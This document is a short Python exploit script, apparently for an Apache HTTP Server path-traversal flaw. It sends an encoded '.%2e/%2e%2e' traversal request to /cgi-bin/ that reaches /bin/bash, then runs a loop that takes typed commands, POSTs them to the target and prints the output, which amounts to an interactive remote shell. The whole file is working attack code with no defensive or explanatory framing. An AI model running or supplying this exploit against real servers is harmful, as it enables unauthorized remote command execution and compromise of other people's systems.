import sys
import time
import requests
import os

def exp(url):
    s = requests.Session()
    try:
        # url = 'http://'+url+'/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/bash'
        url = url + '/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/bash'
        print("payload：", url)
        var = 1
        while var == 1:
            cmd = input("command：")
            command = "echo; " + cmd
            req = requests.Request('POST', url=url, data=command)
            
            prepare = req.prepare()
            prepare.url = url
            response = s.send(prepare, timeout=5)
            output = response.text
            print(output)
            if cmd == "exit":
                os.exit(0)

    except:
        print("Bye bye")
        time.sleep(0.5)
        sys.exit(1)
